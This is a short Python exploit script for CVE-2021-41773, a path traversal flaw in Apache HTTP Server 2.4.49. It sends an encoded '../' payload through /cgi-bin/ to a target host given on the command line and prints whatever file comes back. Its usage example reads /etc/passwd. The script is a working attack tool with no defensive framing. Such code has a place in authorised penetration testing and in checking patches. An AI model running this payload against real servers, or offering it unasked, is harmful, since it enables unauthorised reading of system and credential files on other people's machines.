#!/usr/bin/env python3
import sys
import requests
"""
[*] Exploit Title: Apache HTTP Server 2.4.49 Path Traversal
[*] Author: 0xRar
[*] CVE: CVE-2021-41773
[*] Version: Apache 2.4.49
"""


def main():
    if sys.argv[1] == '-h':
        h = '''
        Example: python3 exploit.py target.net /etc/passwd
        '''
        print(h)

    else:
        try:
            target = sys.argv[1]  # target url
            file = sys.argv[2]  # file to request

            payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e'
            response = requests.get(f'http://{target}{payload}{file}')

            print(response.text)

        except:
            print('Something went wrong with the args.')
            exit()


if __name__ == '__main__':
    main()
